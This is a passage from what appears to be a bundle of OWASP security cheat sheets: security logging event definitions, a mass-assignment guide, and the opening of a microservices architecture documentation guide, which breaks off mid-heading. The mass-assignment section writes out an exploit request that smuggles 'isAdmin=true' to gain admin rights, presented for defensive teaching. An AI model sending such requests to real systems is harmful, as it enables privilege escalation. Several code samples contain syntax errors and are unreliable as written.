[DATA]\r\n\r\nIt's not necessary to log or alert on changes to all files, but in the case of highly sensitive files or data it is important that we monitor and alert on changes.\r\n\r\n---\r\n\r\n### sensitive_create:[userid,file|object]\r\n\r\n**Description**\r\nWhen a new piece of data is created and marked as sensitive or placed into a directory/table/repository where sensitive data is stored, that creation should be logged and reviewed periodically.\r\n\r\n**Level:**\r\nWARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"sensitive_create:joebob1, /users/admin/some/important/path\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User joebob1 created a new file in /users/admin/some/important/path\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### sensitive_read:[userid,file|object]\r\n\r\n**Description**\r\nAll data marked as sensitive or placed into a directory/table/repository where sensitive data is stored should be have access logged and reviewed periodically.\r\n\r\n**Level:**\r\nWARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"sensitive_read:joebob1, /users/admin/some/important/path\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User joebob1 read file /users/admin/some/important/path\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### sensitive_update:[userid,file|object]\r\n\r\n**Description**\r\nAll data marked as sensitive or placed into a directory/table/repository where sensitive data is stored should be have updates to the data logged and reviewed periodically.\r\n\r\n**Level:**\r\nWARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"sensitive_update:joebob1, /users/admin/some/important/path\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User joebob1 modified file /users/admin/some/important/path\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### sensitive_delete:[userid,file|object]\r\n\r\n**Description**\r\nAll data marked as sensitive or placed into a directory/table/repository where sensitive data is stored should have deletions of the data logged and reviewed periodically. The file should not be immediately deleted but marked for deletion and an archive of the file should be maintained according to legal/privacy requirements.\r\n\r\n**Level:**\r\nWARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"sensitive_delete:joebob1, /users/admin/some/important/path\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User joebob1 marked file /users/admin/some/important/path for deletion\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n## Sequence Errors [SEQUENCE]\r\n\r\nAlso called a **_business logic attack_**, if a specific path is expected through a system and an attempt is made to skip or change the order of that path it could indicate malicious intent.\r\n\r\n---\r\n\r\n### sequence_fail:[userid]\r\n\r\n**Description**\r\nWhen a user reaches a part of the application out of sequence it may indicate intentional abuse of the business logic and should be tracked.\r\n\r\n**Level:**\r\nWARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"sequence_fail:joebob1\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User joebob1 has reached a part of the application out of the normal application flow.\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n## Session Management [SESSION]\r\n\r\n### session_created:[userid]\r\n\r\n**Description**\r\nWhen a new authenticated session is created that session may be logged and activity monitored.\r\n\r\n**Level:**\r\nINFO\r\n\r\n**Example:**\r\n\r\n```\r\n    {\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"session_created:joebob1\",\r\n    \"level\": \"INFO\",\r\n    \"description\": \"User joebob1 has started a new session\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### session_renewed:[userid]\r\n\r\n**Description**\r\nWhen a user is warned of session to be expired/revoked and chooses to extend their session that activity should be logged. Also, if the system in question contains highly confidential data then extending a session may require additional verification.\r\n\r\n**Level:**\r\nINFO\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"session_renewed:joebob1\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User joebob1 was warned of expiring session and extended.\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### session_expired:[userid,reason]\r\n\r\n**Description**\r\nWhen a session expires, especially in the case of an authenticated session or with sensitive data, then that session expiry may be logged and clarifying data included. The reason code may be any such as: logout, timeout, revoked, etc. Sessions should never be deleted but rather expired in the case of revocation requirement.\r\n\r\n**Level:**\r\nINFO\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"session_expired:joebob1,revoked\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User joebob1 session expired due to administrator revocation.\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### session_use_after_expire:[userid]\r\n\r\n**Description**\r\nIn the case a user attempts to access systems with an expire session it may be helpful to log, especially if combined with subsequent login failure. This could identify a case where a malicious user is attempting a session hijack or directly accessing another person's machine/browser.\r\n\r\n**Level:**\r\nWARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"session_use_after_expire:joebob1\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User joebob1 attempted access after session expired.\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n## System Events [SYS]\r\n\r\n### sys_startup:[userid]\r\n\r\n**Description**\r\nWhen a system is first started it can be valuable to log the startup, even if the system is serverless or a container, especially if possible to log the user that initiated the system.\r\n\r\n**Level:**\r\nWARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"sys_startup:joebob1\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User joebob1 spawned a new instance\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### sys_shutdown:[userid]\r\n\r\n**Description**\r\nWhen a system is shut down it can be valuable to log the event, even if the system is serverless or a container, especially if possible to log the user that initiated the system.\r\n\r\n**Level:**\r\nWARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"sys_shutdown:joebob1\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User joebob1 stopped this instance\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### sys_restart:[userid]\r\n\r\n**Description**\r\nWhen a system is restarted it can be valuable to log the event, even if the system is serverless or a container, especially if possible to log the user that initiated the system.\r\n\r\n**Level:**\r\nWARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"sys_restart:joebob1\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User joebob1 initiated a restart\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### sys_crash[:reason]\r\n\r\n**Description**\r\nIf possible to catch an unstable condition resulting in the crash of a system, logging that event could be helpful, especially if the event is triggered by an attack.\r\n\r\n**Level:**\r\nWARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"sys_crash:outofmemory,\r\n    \"level\": \"WARN\",\r\n    \"description\": \"The system crashed due to Out of Memory error.\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### sys_monitor_disabled:[userid,monitor]\r\n\r\n**Description**\r\nIf your systems contain agents responsible for file integrity, resources, logging, virus, etc. it is especially valuable to know if they are halted and by whom.\r\n\r\n**Level:**\r\nWARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"sys_monitor_disabled:joebob1,crowdstrike\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User joebob1 has disabled CrowdStrike\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### sys_monitor_enabled:[userid,monitor]\r\n\r\n**Description**\r\nIf your systems contain agents responsible for file integrity, resources, logging, virus, etc. it is especially valuable to know if they are started again after being stopped, and by whom.\r\n\r\n**Level:**\r\nWARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"sys_monitor_enabled:joebob1,crowdstrike\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User joebob1 has enabled CrowdStrike\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n## User Management [USER]\r\n\r\n### user_created:[userid,newuserid,attributes[one,two,three]]\r\n\r\n**Description**\r\nWhen creating new users, logging the specifics of the user creation event is helpful, especially if new users can be created with administration privileges.\r\n\r\n**Level:**\r\nWARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"user_created:joebob1,user1,admin:create,update,delete\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User joebob1 created user1 with admin:create,update,delete privilege attributes\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### user_updated:[userid,onuserid,attributes[one,two,three]]\r\n\r\n**Description**\r\nWhen updating users, logging the specifics of the user update event is helpful, especially if users can be updated with administration privileges.\r\n\r\n**Level:**\r\nWARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"user_updated:joebob1,user1,admin:create,update,delete\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User joebob1 updated user1 with attributes admin:create,update,delete privilege attributes\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### user_archived:[userid,onuserid]\r\n\r\n**Description**\r\nIt is always best to archive users rather than deleting, except where required. When archiving users, logging the specifics of the user archive event is helpful. A malicious user could use this feature to deny service to legitimate users.\r\n\r\n**Level:**\r\nWARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"user_archived:joebob1,user1\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User joebob1 archived user1\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n### user_deleted:[userid,onuserid]\r\n\r\n**Description**\r\nIt is always best to archive users rather than deleting, except where required. When deleting users, logging the specifics of the user delete event is helpful. A malicious user could use this feature to deny service to legitimate users.\r\n\r\n**Level:**\r\nWARN\r\n\r\n**Example:**\r\n\r\n```\r\n{\r\n    \"datetime\": \"2019-01-01 00:00:00,000\",\r\n    \"appid\": \"foobar.netportal_auth\",\r\n    \"event\": \"user_deleted:joebob1,user1\",\r\n    \"level\": \"WARN\",\r\n    \"description\": \"User joebob1 has deleted user1\",\r\n    ...\r\n}\r\n```\r\n\r\n---\r\n\r\n## Exclusions\r\n\r\nAs important as what you DO log is what you DON'T log. Private or secret information, source code, keys, certs, etc. should never be logged.\r\n\r\nFor comprehensive overview of items that should be excluded from logging, please see the [OWASP Logging Cheat Sheet](../cheatsheets/Logging_Cheat_Sheet.md#data-to-exclude).\r\n"
    },
    {
      "Mass_Assignment_Cheat_Sheet.md": "# Mass Assignment Cheat Sheet\r\n\r\n## Introduction\r\n\r\n### Definition\r\n\r\nSoftware frameworks sometime allow developers to automatically bind HTTP request parameters into program code variables or objects to make using that framework easier on developers. This can sometimes cause harm.\r\n\r\nAttackers can sometimes use this methodology to create new parameters that the developer never intended which in turn creates or overwrites new variable or objects in program code that was not intended.\r\n\r\nThis is called a **Mass Assignment** vulnerability.\r\n\r\n### Alternative Names\r\n\r\nDepending on the language/framework in question, this vulnerability can have several [alternative names](https://cwe.mitre.org/data/definitions/915.html):\r\n\r\n- **Mass Assignment:** Ruby on Rails, NodeJS.\r\n- **Autobinding:** Spring MVC, ASP NET MVC.\r\n- **Object injection:** PHP.\r\n\r\n### Example\r\n\r\nSuppose there is a form for editing a user's account information:\r\n\r\n```html\r\n<form>\r\n     <input name=\"userid\" type=\"text\">\r\n     <input name=\"password\" type=\"text\">\r\n     <input name=\"email\" text=\"text\">\r\n     <input type=\"submit\">\r\n</form>  \r\n```\r\n\r\nHere is the object that the form is binding to:\r\n\r\n```java\r\npublic class User {\r\n   private String userid;\r\n   private String password;\r\n   private String email;\r\n   private boolean isAdmin;\r\n\r\n   //Getters & Setters\r\n}\r\n```\r\n\r\nHere is the controller handling the request:\r\n\r\n```java\r\n@RequestMapping(value = \"/addUser\", method = RequestMethod.POST)\r\npublic String submit(User user) {\r\n   userService.add(user);\r\n   return \"successPage\";\r\n}\r\n```\r\n\r\nHere is the typical request:\r\n\r\n```text\r\nPOST /addUser\r\n...\r\nuserid=bobbytables&password=hashedpass&email=bobby@tables.com\r\n```\r\n\r\nAnd here is the exploit in which we set the value of the attribute `isAdmin` of the instance of the class `User`:\r\n\r\n```text\r\nPOST /addUser\r\n...\r\nuserid=bobbytables&password=hashedpass&email=bobby@tables.com&isAdmin=true\r\n```\r\n\r\n### Exploitability\r\n\r\nThis functionality becomes exploitable when:\r\n\r\n- Attacker can guess common sensitive fields.\r\n- Attacker has access to source code and can review the models for sensitive fields.\r\n- AND the object with sensitive fields has an empty constructor.\r\n\r\n### GitHub case study\r\n\r\nIn 2012, GitHub was hacked using mass assignment. A user was able to upload his public key to any organization and thus make any subsequent changes in their repositories. [GitHub's Blog Post](https://blog.github.com/2012-03-04-public-key-security-vulnerability-and-mitigation/).\r\n\r\n### Solutions\r\n\r\n- Allow-list the bindable, non-sensitive fields.\r\n- Block-list the non-bindable, sensitive fields.\r\n- Use [Data Transfer Objects](https://martinfowler.com/eaaCatalog/dataTransferObject.html) (DTOs).\r\n\r\n## General Solutions\r\n\r\nAn architectural approach is to create Data Transfer Objects and avoid binding input directly to domain objects. Only the fields that are meant to be editable by the user are included in the DTO.\r\n\r\n```java\r\npublic class UserRegistrationFormDTO {\r\n private String userid;\r\n private String password;\r\n private String email;\r\n\r\n //NOTE: isAdmin field is not present\r\n\r\n //Getters & Setters\r\n}\r\n```\r\n\r\n## Language & Framework specific solutions\r\n\r\n### Spring MVC\r\n\r\n#### Allow-listing\r\n\r\n```java\r\n@Controller\r\npublic class UserController\r\n{\r\n    @InitBinder\r\n    public void initBinder(WebDataBinder binder, WebRequest request)\r\n    {\r\n        binder.setAllowedFields([\"userid\",\"password\",\"email\"]);\r\n    }\r\n...\r\n}\r\n```\r\n\r\nTake a look [here](https://docs.spring.io/spring/docs/current/javadoc-api/org/springframework/validation/DataBinder.html#setAllowedFields-java.lang.String...-) for the documentation.\r\n\r\n#### Block-listing\r\n\r\n```java\r\n@Controller\r\npublic class UserController\r\n{\r\n   @InitBinder\r\n   public void initBinder(WebDataBinder binder, WebRequest request)\r\n   {\r\n      binder.setDisallowedFields([\"isAdmin\"]);\r\n   }\r\n...\r\n}\r\n```\r\n\r\nTake a look [here](https://docs.spring.io/spring/docs/current/javadoc-api/org/springframework/validation/DataBinder.html#setDisallowedFields-java.lang.String...-) for the documentation.\r\n\r\n### NodeJS + Mongoose\r\n\r\n#### Allow-listing\r\n\r\n```javascript\r\nvar UserSchema = new mongoose.Schema({\r\n    userid: String,\r\n    password: String,\r\n    email : String,\r\n    isAdmin : Boolean,\r\n});\r\n\r\nUserSchema.statics = {\r\n    User.userCreateSafeFields: ['userid', 'password', 'email']\r\n};\r\n\r\nvar User = mongoose.model('User', UserSchema);\r\n\r\n_ = require('underscore');\r\nvar user = new User(_.pick(req.body, User.userCreateSafeFields));\r\n```\r\n\r\nTake a look [here](http://underscorejs.org/#pick) for the documentation.\r\n\r\n#### Block-listing\r\n\r\n```javascript\r\nvar massAssign = require('mongoose-mass-assign');\r\n\r\nvar UserSchema = new mongoose.Schema({\r\n    userid: String,\r\n    password: String,\r\n    email : String,\r\n    isAdmin : { type: Boolean, protect: true, default: false }\r\n});\r\n\r\nUserSchema.plugin(massAssign);\r\n\r\nvar User = mongoose.model('User', UserSchema);\r\n\r\n/** Static method, useful for creation **/\r\nvar user = User.massAssign(req.body);\r\n\r\n/** Instance method, useful for updating**/\r\nvar user = new User;\r\nuser.massAssign(req.body);\r\n\r\n/** Static massUpdate method **/\r\nvar input = { userid: 'bhelx', isAdmin: 'true' };\r\nUser.update({ '_id': someId }, { $set: User.massUpdate(input) }, console.log);\r\n```\r\n\r\nTake a look [here](https://www.npmjs.com/package/mongoose-mass-assign) for the documentation.\r\n\r\n### Ruby On Rails\r\n\r\nTake a look [here](https://guides.rubyonrails.org/v3.2.9/security.html#mass-assignment) for the documentation.\r\n\r\n### Django\r\n\r\nTake a look [here](https://coffeeonthekeyboard.com/mass-assignment-security-part-10-855/) for the documentation.\r\n\r\n### ASP NET\r\n\r\nTake a look [here](https://odetocode.com/Blogs/scott/archive/2012/03/11/complete-guide-to-mass-assignment-in-asp-net-mvc.aspx) for the documentation.\r\n\r\n### PHP Laravel + Eloquent\r\n\r\n#### Allow-listing\r\n\r\n```php\r\n<?php\r\n\r\nnamespace App;\r\n\r\nuse Illuminate\\Database\\Eloquent\\Model;\r\n\r\nclass User extends Model\r\n{\r\n    private $userid;\r\n    private $password;\r\n    private $email;\r\n    private $isAdmin;\r\n\r\n    protected $fillable = array('userid','password','email');\r\n}\r\n```\r\n\r\nTake a look [here](https://laravel.com/docs/5.2/eloquent#mass-assignment) for the documentation.\r\n\r\n#### Block-listing\r\n\r\n```php\r\n<?php\r\n\r\nnamespace App;\r\n\r\nuse Illuminate\\Database\\Eloquent\\Model;\r\n\r\nclass User extends Model\r\n{\r\n    private $userid;\r\n    private $password;\r\n    private $email;\r\n    private $isAdmin;\r\n\r\n    protected $guarded = array('isAdmin');\r\n}\r\n```\r\n\r\nTake a look [here](https://laravel.com/docs/5.2/eloquent#mass-assignment) for the documentation.\r\n\r\n### Grails\r\n\r\nTake a look [here](http://spring.io/blog/2012/03/28/secure-data-binding-with-grails/) for the documentation.\r\n\r\n### Play\r\n\r\nTake a look [here](https://www.playframework.com/documentation/1.4.x/controllers#nobinding) for the documentation.\r\n\r\n### Jackson (JSON Object Mapper)\r\n\r\nTake a look [here](https://www.baeldung.com/jackson-field-serializable-deserializable-or-not) and [here](http://lifelongprogrammer.blogspot.com/2015/09/using-jackson-view-to-protect-mass-assignment.html) for the documentation.\r\n\r\n### GSON (JSON Object Mapper)\r\n\r\nTake a look [here](https://sites.google.com/site/gson/gson-user-guide#TOC-Excluding-Fields-From-Serialization-and-Deserialization) and [here](https://stackoverflow.com/a/27986860) for the document.\r\n\r\n### JSON-Lib (JSON Object Mapper)\r\n\r\nTake a look [here](http://json-lib.sourceforge.net/advanced.html) for the documentation.\r\n\r\n### Flexjson (JSON Object Mapper)\r\n\r\nTake a look [here](http://flexjson.sourceforge.net/#Serialization) for the documentation.\r\n\r\n## References and future reading\r\n\r\n- [Mass Assignment, Rails and You](https://code.tutsplus.com/tutorials/mass-assignment-rails-and-you--net-31695)\r\n"
    },
    {
      "Microservices_based_Security_Arch_Doc_Cheat_Sheet.md": "# Microservices based Security Arch Doc Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThe microservice architecture is being increasingly used for designing and implementing application systems in both cloud-based and on-premise infrastructures. There are many security challenges need to be addressed in the application design and implementation phases. In order to address some security challenges it is necessity to collect security-specific information on application architecture.\r\nThe goal of this article is to provide a concrete proposal of approach to collect microservice-based architecture information to securing application.\r\n\r\n## Context\r\n\r\nDuring securing applications based on microservices architecture, security architects/engineers usually face with the following questions (mostly referenced in the [OWASP Application Security Verification Standard Project](https://github.com/OWASP/ASVS) under the section [V1 \"Architecture, Design and Threat Modeling Requirements\"](https://github.com/OWASP/ASVS/blob/master/4.0/en/0x10-V1-Architecture.md#v1-architecture-design-and-threat-modeling-requirements)):\r\n\r\n1. Threat modeling and enforcement of the principle of least privilege:\r\n    - What scopes or API keys does microservice minimally need to access other microservice APIs?\r\n    - What grants does microservice minimally need to access database or message queue?\r\n2. Data leakage analysis:\r\n    - What storages or message queues do contain sensitive data?\r\n    - Does microservice read/write date from/to specific database or message queue?\r\n    - What microservices are invoked by dedicated microservice? What data is passed between microservices?\r\n3. Attack surface analysis:\r\n    - What microservices endpoints need to be tested during security testing?\r\n\r\nIn most cases, existing application architecture documentation is not suitable to answer those questions. Next sections propose what architecture security-specific information can be collected to answer the questions above.\r\n\r\n## Objective\r\n\r\nThe objectives of the cheat sheet are to explain what architecture security-specific information can be collected to answer the questions above and provide concrete proposal of approach to collect microservice-based architecture information to securing application.\r\n\r\n## Proposition\r\n\r\n### Collect information on the building blocks\r\n\r\n#### Identify and describe application-functionality services\r\n\r\nApplication-functionality services implement one or several business process or functionality (e.g., storing customer details, storing and displaying product catalog). Collect information on the parameters listed below related to each application-functionality service.\r\n\r\n| Parameter name | Description |\r\n| :--- | :--- |\r\n| Service name (ID) | Unique service name or ID\r\n| Short description | Short description of business process or functionality implemented by the microservice\r\n| Link to source code repository | Specify a link to service source code repository\r\n| Development Team | Specify development team which develops the microservice\r\n| API definition | If microservice exposes external interface specify a link to the interface description (e.g., OpenAPI specification). It is advisable to define used security scheme, e.g. define scopes or API keys needed to invoke dedicated endpoint (e.g., [see](https://swagger.io/docs/specification/authentication/)).\r\n| The microservice architecture description | Specify a link to the microservice architecture diagram, description (if available)|\r\n| Link to runbook | Specify a link to the microservice runbook |\r\n\r\n#### Identify and describe infrastructure services\r\n\r\nInfrastructure services including remote services may implement authentication, authorization, service registration and discovery, security monitoring, logging etc. Collect information on the parameters listed below related to each infrastructure service.\r\n\r\n| Parameter name | Description |\r\n| :--- | :--- |\r\n|Service name (ID) | Unique service name or ID\r\n|Short description | Short description of functionality implemented by the service (e.g., authentication, authorization, service registration and discovery, logging, security monitoring, API gateway).\r\n|Link to source code repository | Specify a link to service source code repository (if applicable)\r\n|Link to the service documentation | Specify a link to the service documentation that includes service API definition, operational guidance/runbook, etc.\r\n\r\n#### Identify and describe data storages\r\n\r\nCollect information on the parameters listed below related to each data storage.\r\n\r\n| Parameter name | Description |\r\n| :--- | :--- |\r\n|Storage name (ID) | Unique storage name or ID\r\n|Software type | Specify software that implements the data storage (e.g., PostgreSQL, Redis, Apache Cassandra).\r\n\r\n#### Identify and describe message queues\r\n\r\nMessaging systems (e.g., RabbitMQ or Apache Kafka) are used to implement asynchronous microservices communication mechanism. Collect information on the parameters listed below related to each message queue.\r\n\r\n| Parameter name | Description |\r\n| :--- | :--- |\r\n|Message queue (ID) | Unique message queue name or ID\r\n|Software type | Specify software that implements the message queue (e.g., RabbitMQ, Apache Kafka).\r\n\r\n#### Identify and describe data assets\r\n\r\nIdentify and describe data assets that processed by system microservices/services. It is advisable firstly to identify assets, which are valuable from a security perspective (e.g., \"User information\", \"Payment\"). Collect information on the parameters listed below related to each asset.\r\n\r\n| Parameter name | Description |\r\n| :--- | :--- |\r\n| Asset name (ID) | Unique asset name or ID\r\n| Protection level | Specify asset protection level (e.g., PII, confidential)\r\n| Additional info | Add clarifying information\r\n\r\n### Collect information on relations between building blocks\r\n\r\n#### Identify \"service-to-storage\" relations\r\n\r\nCollect information on the parameters listed below related to each \"service-to-storage\" relation.\r\n\r\n| Parameter name | Description |\r\n| :--- | :--- |\r\n| Service name (ID) | Specify service name (ID) defined above\r\n| Storage name (ID) | Specify storage name (ID) defined above\r\n| Access type | Specify access type, e.g. \"Read\" or \"Read/Write\"\r\n\r\n#### Identify \"service-to-service\" synchronous communications\r\n\r\nCollect information on the parameters listed below related to each \"service-to-service\" synchronous communication.\r\n\r\n| Parameter name | Description |\r\n| :--- | :--- |\r\n| Caller service name (ID) | Specify caller service name (ID) defined above\r\n| Called service name (ID) | Specify called service name (ID) defined above\r\n| Protocol/framework used| Specify protocol/framework used for communication, e.g. HTTP (REST, SOAP), Apache Thrift, gRPC\r\n| Short description | Shortly describe the purpose of communication (requests for query of information or request/commands for a state-changing business function) and data passed between services (if possible, in therms of assets defined above)\r\n\r\n#### Identify \"service-to-service\" asynchronous communications\r\n\r\nCollect information on the parameters listed below related to each \"service-to-service\" asynchronous communication.\r\n\r\n| Parameter name | Description |\r\n| :--- | :--- |\r\n| Publisher service name (ID) | Specify publisher service name (ID) defined above\r\n| Subscriber service name (ID) | Specify subscriber service name (ID) defined above\r\n| Message queue (ID) | Specify message queue (ID) defined above\r\n| Short description | Shortly describe the purpose of communication (receiving of information or commands for a state-changing business function) and data passed between services (if possible, in therms of assets defined above)\r\n\r\n#### Identify \"asset-to-storage\" relations\r\n\r\nCollect information on the parameters listed below related to each \"asset-to-storage\" relation.\r\n\r\n| Parameter name | Description |\r\n| :--- | :--- |\r\n| Asset name (ID) | Asset name (ID) defined above\r\n| Storage name (ID) | Specify storage name (ID) defined above\r\n| Storage type | Specify storage type for the asset, e.g. \"golden source\" or \"cache\"\r\n\r\n### Create a graphical presentation of application architecture\r\n\r\nIt is advisable to create graphical presentation of application architecture (building blocks and relations defined above) in form of services call graph or data flow diagram. In order to do that one can use special software tools (e.g. Enterprise Architect) or [DOT language](https://en.wikipedia.org/wiki/DOT_%28graph_description_language%29). See example of using DOT language [here](https://gist.github.com/vladgolubev/80c5523336ddec3859c0e90d9a070882).\r\n\r\n### Use collected information in secure software development practices\r\n\r\nCollected information may be useful for doing application security practices, e.g. during defining security requirements, threat modeling or security testing. Sections below contains examples of activities related to securing application architecture (as well as its mapping to OWASP projects) and tips for their implementation using information collected above.\r\n\r\n#### Attack surface analysis\r\n\r\n##### Implementation tips\r\n\r\nTo enumerate microservices endpoints that need to be tested during security testing and analyzed during threat modeling analyze data collected under the following sections:\r\n\r\n- Identify and describe application-functionality services (parameter \"API definition\")\r\n- Identify and describe infrastructure services (parameter \"Link to the service documentation\")\r\n\r\n##### Mapping to OWASP projects\r\n\r\n- [OWASP ASVS, V1 \"Architecture, Design and Threat Modeling Requirements\", #1.1.2](https://github.com/OWASP/ASVS/blob/master/4.0/en/0x10-V1-Architecture.md#v1-architecture-design-and-threat-modeling-requirements)\r\n- [OWASP Attack Surface Analysis Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Attack_Surface_Analysis_Cheat_Sheet.md)\r\n\r\n#### Data leakage analysis\r\n\r\n##### Implementation tips\r\n\r\nTo analyze possible data leakage analyze data collected under the following sections:\r\n\r\n- Identify and describe data assets\r\n- Identify \"service-to-storage\" relations\r\n- Identify \"service-to-service\" synchronous communications\r\n- Identify \"service-to-service\" asynchronous communications\r\n- Identify \"asset-to-storage\" relations\r\n\r\n##### Mapping to OWASP projects\r\n\r\n- [OWASP ASVS, V1 \"Architecture, Design and Threat Modeling Requirements\", #1.1.2](https://github.com/OWASP/ASVS/blob/master/4.0/en/0x10-V1-Architecture.md#v1-architecture-design-and-threat-modeling-requirements)\r\n- [OWASP Top 10-2017 A3-Sensitive Data Exposure](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)\r\n\r\n#### Application's trust boundaries, components, and significant data flows justification\r\n\r\n##### Implementation tips\r\n\r\nTo verify documentation and justification of all the application's trust boundaries, components, and significant data flows analyze data collected under the following sections:\r\n\r\n- Identify and describe application-functionality services\r\n- Identify and describe infrastructure services\r\n- Identify and describe data storages\r\n- Identify and describe message queues\r\n- Identify \"service-to-storage\" relations\r\n- Identify \"service-to-service\" synchronous communications\r\n- Identify \"service-to-service\" asynchronous communications\r\n\r\n##### Mapping to OWASP projects\r\n\r\n- [OWASP ASVS, V1 \"Architecture, Design and Threat Modeling Requirements\", #1.1.4](https://github.com/OWASP/ASVS/blob/master/4.0/en/0x10-V1-Architecture.md#v1-architecture-design-and-threat-modeling-requirements)\r\n\r\n#### Analysis of the application's high-level architecture\r\n\r\n##### Implementation tips\r\n\r\nTo verify definition and security analysis of the application's high-level architecture and all connected remote services analyze data collected under the following sections:\r\n\r\n- Identify and describe application-functionality services\r\n- Identify and describe infrastructure services\r\n- Identify and describe data storages\r\n- Identify and describe message queues\r\n\r\n##### Mapping to OWASP projects\r\n\r\n- [OWASP ASVS, V1 \"Architecture, Design and Threat Modeling Requirements\", #1.1.5](https://github.com/OWASP/ASVS/blob/master/4.0/en/0x10-V1-Architecture.md#v1-architecture-design-and-threat-modeling-requirements)\r\n\r\n#### Implementation of centralized security controls verification\r\n\r\n##### Implementation tips\r\n\r\nTo verify implementation of centralized, simple (economy of design), vetted, secure, and reusable security controls to avoid duplicate, missing, ineffective, or insecure controls analyze data collected under the section \"Identify and describe infrastructure services\".\r\n\r\n##### Mapping to OWASP projects\r\n\r\n- [OWASP ASVS, V1 \"Architecture, Design and Threat Modeling Requirements\", #1.1.6](https://github.com/OWASP/ASVS/blob/master/4.0/en/0x10-V1-Architecture.md#v1-architecture-design-and-threat-modeling-requirements)\r\n\r\n#### Enforcement of the principle of least privilege\r\n\r\n##### Implementation 